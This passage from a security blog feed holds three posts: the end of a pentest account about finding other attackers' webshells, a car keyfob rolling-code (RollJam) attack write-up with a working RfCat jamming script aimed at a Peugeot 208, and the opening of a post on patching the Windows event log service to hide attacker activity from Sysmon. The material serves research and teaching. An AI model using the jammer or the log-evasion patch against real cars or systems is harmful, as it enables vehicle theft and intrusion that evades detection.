&lt;p&gt;To find the location of the webroot I simply use my webshell to search for the location of my webshell file name to find where all files uploaded via this exploit would land on the file system. Sure enough, I found the appearance of my webshell in a folder that we will falsely call &lt;em&gt;/home/UserName/AppName/Authenticated.&lt;/em&gt; The natural next step is to list the contents of this directory as seen in the screenshot below.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19451&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;265&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/2-1.png&#34; title=&#34;Figure 2&#34; alt=&#34;2 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 2&lt;/figcaption&gt;
  &lt;/figure&gt; Contents of Webroot[/caption]&lt;/p&gt;
&lt;p&gt;Whilst this was useful, it was listing the files in alphabetical order which made it difficult to process which file could be a malicious JSP file versus one naturally used for webserver installation. I do another &lt;em&gt;ls&lt;/em&gt; command but this time listing the contents of the directory in descending order of date modified. That helps clear things up!&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19452&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;556&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/3-1.png&#34; title=&#34;Figure 3&#34; alt=&#34;3 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 3&lt;/figcaption&gt;
  &lt;/figure&gt; Contents sorted by Date Modified[/caption]&lt;/p&gt;
&lt;p&gt;I immediately notice the large number of files that have the exact same last modified date and time on Feb 9th. My assumption is that Feb 9th was when the webserver was installed, as all the installation files share this modification date. This leaves 8 files that have been uploaded in the 21 days since installation. The top entry (cmd.jsp) is my webshell and can be excluded. Judging by the time stamps and similar file names this still leaves several unaccounted for JSP files. Naturally, I did a &lt;em&gt;cat&lt;/em&gt; on those files and sure enough…they were also webshells.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19453&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;477&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/4-1.png&#34; title=&#34;Figure 4&#34; alt=&#34;4 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 4&lt;/figcaption&gt;
  &lt;/figure&gt; Threat Actor Webshells[/caption]&lt;/p&gt;
&lt;p&gt;At this point I know we have stumbled upon something bad. I phone the client and let them know the news whilst I continue trying to attribute some of the webshells. Due to the fact that some of the files had very similar names and were uploaded consecutively I can safely assume that they belong to the same threat actor. When grouping as such, I arrive at the conclusion that there have been 4 threat actors who have exploited this in the last 5 days!&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/5-1.png&#34; title=&#34;5 1&#34; alt=&#34;5 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This is, of course, not counting any threat actors who had deleted their webshells when not in use like I had done. In the same vein, it is important to bear in mind that this was only one of several appearances of this vulnerable server in the estate.&lt;/p&gt;
&lt;p&gt;I reach out to the client to ask permission to repeat the same process on the other vulnerable instances, but by this point the client has engaged their Managed Detection and Response (MDR) provider who has already begun the digital forensics work of identifying the extent of the damage,  whilst the client’s security team begin working on a patch. I write up a professional document containing all my findings, remediation steps, etc., and hand it over to both parties.&lt;/p&gt;
&lt;p&gt;Later that evening I receive an email saying that the vulnerability has been patched and, thankfully, it appears it was caught before it became too much of an issue. However, the MDR provider did see attempts to jump from the external box to the internal network, and confirmed that the box had been enrolled in a crypto mining bot network to use its resources for crypto mining. All things considered this was a pretty good outcome after the initial shock of compromising such a sensitive system.&lt;/p&gt;
&lt;p&gt;And with that quick turnaround my brief headbutt with a genuine and active threat actor(s) came to an end. It is not every day that you get findings like this but it lit the fire in me to get more exposure to the Incident Response side of things, and the client was happy we’d found and fixed a critical vulnerability in just a handful of hours. Wins all round!&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Car Hacking - Manual Bypass of Modern Rolling Code Implementations</title>
      <link>//localhost:1313/articles/2021/07/2021-07-22-car-hacking-manual-bypass-of-modern-rolling-code-implementations/</link>
      <pubDate>Thu, 22 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/07/2021-07-22-car-hacking-manual-bypass-of-modern-rolling-code-implementations/</guid>
      <description>
        
        
        &lt;h1&gt;Introduction&lt;/h1&gt;&lt;p&gt;I recently researched modern algorithms used by keyfobs to open cars. Since most of the blogs online talking about the topic are unfortunately quite old and in general and do not precisely describe the exact path followed in detail, nor the code used. I thought that talking about my experience could be interesting and inspiring for other researchers.&lt;/p&gt;
&lt;p&gt;I won’t go in depth on certain topics and I will assume that the reader has a general background in basic signals theory and is comfortable with terms like radio frequencies, gain, filters…&lt;/p&gt;
&lt;p&gt;All the scripts used to reproduce the attack are downloadable at the following link:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/0x5c4r3/Rolling_Code_Bypass&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Github.com: Rolling_Code_Bypass&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: This thread is the first part of a research that focuses on finding a way to automatically bypass car mechanisms implementing different algorithms. Following posts will be shared during the next few months.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;: All the information provided on this post is for educational purposes only. JUMPSEC is no way responsible for any misuse of the information.&lt;/p&gt;
&lt;h1&gt;Background&lt;/h1&gt;&lt;h2&gt;Algorithms&lt;span class=&#34;absolute -mt-20&#34; id=&#34;algorithms&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#algorithms&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Two are the main algorithms used to send opening signals to cars:&lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;Single code&lt;/strong&gt;: The keyfob always sends the same code to the car that accepts it and opens. This is an old implementation used by cars manufactured until ~2002. This legacy implementation lacks basic security since whoever intercepts the signal is able to use it to open the car (known as a replay attack). Surprisingly, in my experience, I still found modern cars implementing such algorithms. &lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;Rolling code&lt;/strong&gt;: The keyfob uses an array of codes, each of which is only usable once. This much safer implementation that protects against replay attacks and is mostly used in modern cars, the most recent version will be our main focus for this research. [2]&lt;/p&gt;
&lt;h1&gt;My Path&lt;/h1&gt;&lt;h2&gt;Tools Used&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tools-used&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tools-used&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to detect Radio frequencies from a computer, there’s the need to use radio peripherals capable of converting radio signals from analog to digital . In my experience, I tried to use all of the most well known ones, to then choose which is the best for transmitting, receiving and jamming (see section 3.3).&lt;/p&gt;
&lt;p&gt;My choices have been the following:&lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;HackRF&lt;/strong&gt;: Best device for RFHacking so far. Wide range of frequencies handled, versatile, easy to use, quite a lot of documentation online. It’s been the most used hardware device for the entire research. [3]&lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;Yard Stick One&lt;/strong&gt;: Not much documentation online, I personally did not like the way it’s implemented with the RFcat firmware loaded. I ended up using it only for jamming. [4]&lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;RTL SDR&lt;/strong&gt;: Only able to receive signals. I’m not happy about this piece, it gets overheated very often until there’s the need to unplug it and wait for it to cool down. I used it initially to track signals, but once I started testing with the HackRF, there has not been the need to use it anymore.&lt;/p&gt;
&lt;h2&gt;First Test: Replay Attack&lt;span class=&#34;absolute -mt-20&#34; id=&#34;first-test-replay-attack&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#first-test-replay-attack&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To start playing around with radio frequencies, I bought a cheap radio doorbell - made of a transmitter (an actual button to stick out of the doorstep) and a couple of receivers that ring when the doorbell is clicked, then I started playing around with that. Since doorbells are quite cheap and do not need an enhanced security, they implement a basic single code algorithm, useful for testing.&lt;/p&gt;
&lt;p&gt;With that in mind, the first step was to see the signal sent from the remote doorbell using HackRF and &lt;em&gt;gqrx&lt;/em&gt;, a tool that visualises radio frequencies. Once the frequency and other settings have been set up, I observed the output shown in Figure 1.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/1.gif&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 1 - gqrx tracking the signal of the doorbell when the button is clicked.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Note that usually the real frequency can be slightly moved from the one detected, depending also on the temperature of the room. From the specs, we know that the doorbell works at 433.92 MHz.&lt;/p&gt;
&lt;p&gt;Once visualized, I tried to dump the data the doorbell is sending.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2-1024x337.png&#34; alt=&#34;2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 2 - Universal Radio Hacker (urh) [6] showing the recorded signal as a waveform.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt; If carefully analyzed, we can see that the waveform is actually containing 4 equal repeated signals. Below the waveform, the software is able to convert the signal to bytes. This happens through the specified modulation (in the picture on the left, Amplitude-shift keying, aka ASK). The problem with approaching modulations is that since it can totally change the output code, we should know which type the signal is using and that is often not specified.&lt;/p&gt;
&lt;p&gt;To bypass that problem, I chose to work at Signal level, modifying the actual signal and not dealing with the output code.&lt;/p&gt;
&lt;p&gt;Once I recorded the signal, I cropped it to a single repetition and transmitted it through the HackRF, making the doorbell receiver ring and proving that the path followed was right.&lt;/p&gt;
&lt;h1&gt;Rolling Code Bypass Theory&lt;/h1&gt;&lt;p&gt;Since hacking into a doorbell was not as satisfying as I expected, I tried to raise the level of the research to Rolling codes, trying first to understand the exact process needed.&lt;/p&gt;
&lt;p&gt;The methodology I am going to describe requires both some exploitation techniques and a little bit of social engineering.&lt;/p&gt;
&lt;p&gt;The  basic “Rolljam Attack” - that’s how various blogs online call it - is based on forcing the victim to send 2 (instead of 1) opening signals, intercepting them in a way that the owner of the car will not notice that one of the two codes has been stolen and is ready to be used. Also, the attacker needs to be close enough to the car so that the signal can be both sent and received.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/3-1-edited.png&#34; alt=&#34;3 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 3 - Basic functionality of a general Keyfob.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The key of such attack is &lt;strong&gt;Jamming&lt;/strong&gt;, sending a strong signal that blocks the car receiver from detecting the message sent from the keyfob.&lt;/p&gt;
&lt;p&gt;Since the frequency of a signal depends on different factors, some of which are casual - like the temperature - the receiver has a range of accepted frequencies, also called bandwidth.&lt;/p&gt;
&lt;p&gt;The Jamming signal must be sent within the car’s receiving window (or bandwidth), at a slightly moved frequency from the one used from the keyfob.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/4.png&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 4 - A representation of a Rolling Code Bypass attack, showing the jamming frequency within the car receiving window.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The tricky part of the attack is that, while jamming, the attacker has to be able to detect and filter the signal sent by the owner of the car trying to open his vehicle. If the attacker is able to do so, the rest of the path is just a matter of implementation.&lt;/p&gt;
&lt;p&gt;Looking at Figure 4, we can clearly see all the signals we are dealing with: the &lt;strong&gt;Jamming&lt;/strong&gt; signal (Green), slightly moved from the actual frequency used from the &lt;strong&gt;keyfob&lt;/strong&gt; (Pink), both within the car receiving window (Red).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/5.png&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 5 - A device jamming and storing the first code simultaneously.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Once the first code has been stored from the device used by the attacker (that usually is a computer with some radio dongles) and not received by the car because of the jamming, the owner of the car will think that the car did not received the signal because of other reasons and will try to open it again. While clicking the button the second time, the device will store the second signal, stop jamming and send the first signal in a matter of milliseconds.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/6.png&#34; alt=&#34;6&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 6 - A device jamming and storing the second code simultaneously.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/7-edited.png&#34; alt=&#34;7&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 7 - A device sending the 1st code received, opening the car.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The car will receive the 1st signal from the device and open and the owner will think that now everything worked properly, but the reality is that the attacker will still own the 2nd code able to open the car.&lt;/p&gt;
&lt;h1&gt;Implementation&lt;/h1&gt;&lt;p&gt;In this example, I will explain how I hacked into a Peugeot 208 from 2020 that implements rolling code. Since the key to the rolling code attack and the most difficult part of its bypass is the ability to jam and record at the same time, I will focus on the explanation of such functionality, skipping the rest of the process since it is only a matter of implementation and it is easily replicable.&lt;/p&gt;
&lt;p&gt;Note that the car and keyfob communicate at a frequency of 433.92 MHz.&lt;/p&gt;
&lt;p&gt;After several tests and implementations that ended up being not functional, I reached a proper one using the Yard Stick One to jam and the HackRF to deal with the unlocking signals sent from the keyfobs.&lt;/p&gt;
&lt;p&gt;Here’s the really simple Python3 script I wrote to jam the signal:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;rflib&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RfCat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setFreq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;433800000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setMdmModulation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MOD_ASK_OOK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setMdmDRate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4800&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Starting&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RFxmit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x17\x17\x17\x17\x17\x17\x17\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As you can see from the script, the jamming frequency is set at 433.80 MHz, exactly 120 kHz below the frequency used by the keyfob but still in the range accepted by the car.&lt;/p&gt;
&lt;p&gt;Once the script is run, the car won’t be able to receive other signals and will keep being closed even if the owner clicks the opening button.&lt;/p&gt;
&lt;p&gt;Meanwhile we are jamming, we need to use a tool able to both record and send signals from my laptop. I personally found &lt;em&gt;GNU Radio&lt;/em&gt; the best tool to do so, and I wrote two scripts, one to record and the other one to replay the signal recorded.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/8-1024x555.png&#34; alt=&#34;8&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 8 - 1st script used to save the signal received in a file.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The first script is made of a &lt;em&gt;osmocom&lt;/em&gt; [5] Source block that is set to work with the HackRF, recording a signal at a central frequency of 433.92MHz with a bandwidth of 100 kHz. The bandwidth setting will allow the HackRF to cut out the jamming signal, cleaning it and recording only the part we need (the actual keyfob opening signal). It will then send it to a live GUI that will show us the peaks in the frequency spectrum and save it to a file called &lt;em&gt;Peugeot_208&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;All of these must happen while the Python3 jamming script represented in the portion of code above keeps running.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/9-1024x409.png&#34; alt=&#34;9&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 9 - 2nd script used to replay the signal previously saved.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Once the python script has been interrupted, the second script will grab the &lt;em&gt;Peugeot 208&lt;/em&gt; file with the filtered signal in it, multiply it and send it to both a GUI and to the HackRF, which will transmit it to the car.&lt;/p&gt;
&lt;p&gt;And here’s the magic:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/10.gif&#34; alt=&#34;10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The car will receive the signal and open.&lt;/p&gt;
&lt;h2&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;[1] &lt;a href=&#34;https://en.wikipedia.org/wiki/Remote_keyless_system&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://en.wikipedia.org/wiki/Remote_keyless_system&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] &lt;a href=&#34;https://en.wikipedia.org/wiki/Rolling_code&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://en.wikipedia.org/wiki/Rolling_code&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[3] &lt;a href=&#34;https://greatscottgadgets.com/hackrf/one/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://greatscottgadgets.com/hackrf/one/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[4] &lt;a href=&#34;https://greatscottgadgets.com/yardstickone/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://greatscottgadgets.com/yardstickone/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[5] &lt;a href=&#34;https://osmocom.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://osmocom.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[6] &lt;a href=&#34;https://github.com/jopohl/urh&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/jopohl/urh&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[7] &lt;a href=&#34;https://gqrx.dk/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gqrx.dk/&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Pwning Windows Event Logging with YARA rules</title>
      <link>//localhost:1313/articles/2020/09/2020-09-04-pwning-windows-event-logging-with-yara-rules/</link>
      <pubDate>Fri, 04 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/09/2020-09-04-pwning-windows-event-logging-with-yara-rules/</guid>
      <description>
        
        
        &lt;p&gt;The Event Log coupled with Windows Event Forwarding and Sysmon can be extremely powerful in the hands of defenders, allowing them to detect attackers every step of the way. Obviously this is an issue for the attackers. Before privilege escalation it is limited what we can do to evade event logging, but once privileges have been elevated it is an equal playing field.&lt;/p&gt;
&lt;p&gt;In the past I have released a &lt;a href=&#34;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;method&lt;/a&gt; to evade this logging by loading a malicious kernel driver and hooking the &lt;code&gt;NtTraceEvent&lt;/code&gt; syscall. This method is effective but has two issues. The main issue is the risk associated with loading a kernel driver and patching syscalls as there is the potential to cause a BSOD on the machine which for obvious reasons a very bad thing. The other issue is that it will simply stop all events from being reported, so while the hook is active that machine will no longer be sending events to the SOC or SIEM. Its a real possibility that defenders would notice this sudden lack of events. So is there a way to only filter out the events caused by an attacker while also remaining completely inside usermode? Yes.&lt;/p&gt;
&lt;p&gt;A couple of years ago &lt;a href=&#34;https://twitter.com/hlldz&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@hlldz&lt;/a&gt; released &lt;a href=&#34;https://github.com/hlldz/Invoke-Phant0m&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Invoke-Phant0m&lt;/a&gt;. It would find the event log process and then kill all the threads running from &lt;code&gt;wevtsvc.dll&lt;/code&gt;. This is because &lt;code&gt;wevtsvc.dll&lt;/code&gt; &lt;strong&gt;is&lt;/strong&gt; the event log service so by killing the threads associated with it will disable the logging. It works well but still has the same issue that ghost in the logs does, all events stopped from being reported. To solve this issue I wanted to make a tool that will be similar to &lt;code&gt;Invoke-Phant0m&lt;/code&gt; but will allow an attacker to apply a filter to the events being reported so they can only block events related to there malicious actions.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Reversing the event log service.&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reversing-the-event-log-service&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reversing-the-event-log-service&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;After opening &lt;code&gt;wevtsvc.dll&lt;/code&gt; in cutter and looking around I noticed that it will open a tracing session via &lt;code&gt;OpenTraceW&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/disass_opentrace.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;OpenTraceW&lt;/code&gt; takes the &lt;code&gt;EVENT_TRACE_LOGFILEW&lt;/code&gt; structure as an argument. This structure has the value &lt;code&gt;EventRecordCallback&lt;/code&gt; which points to the callback function that will be given the event.&lt;/p&gt;
&lt;p&gt;With a bit of digging about in windbg I found the callback function is &lt;code&gt;wevtsvc!EtwEventCallback&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/stacktrace-1024x152.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Looking at the disassembly of the callback we can see that it does not look like a function, but rather is just a bit of assembly that will call &lt;code&gt;EventCallback&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/callback_disass.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Setting a breakpoint on &lt;code&gt;wevtsvc!EtwEventCallback&lt;/code&gt; we are able to dig a bit more into how this callback works. It will receive the event in the &lt;code&gt;EVENT_RECORD&lt;/code&gt; structure which looks like;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;typedef struct _EVENT_RECORD {
  EVENT_HEADER                     EventHeader;
  ETW_BUFFER_CONTEXT               BufferContext;
  USHORT                           ExtendedDataCount;
  USHORT                           UserDataLength;
  PEVENT_HEADER_EXTENDED_DATA_ITEM ExtendedData;
  PVOID                            UserData;
  PVOID                            UserContext;
} EVENT_RECORD, *PEVENT_RECORD;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;EVENT_HEADER&lt;/code&gt; structure will contain more info about the event including the provider which is reporting the event. With a little windbg magic we are able to grab this providers GUID.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/extractguid-1024x460.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now that we have the providers GUID we can look it up using the &lt;code&gt;logman.exe&lt;/code&gt; utility, and see that the provider was &lt;code&gt;Microsoft-Windows-Sysmon&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/logman_sysmon.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now we know we are looking in the right place we can patch this function with a &lt;code&gt;ret&lt;/code&gt; instruction. This will stop all the events from being reported.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/retpatch.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
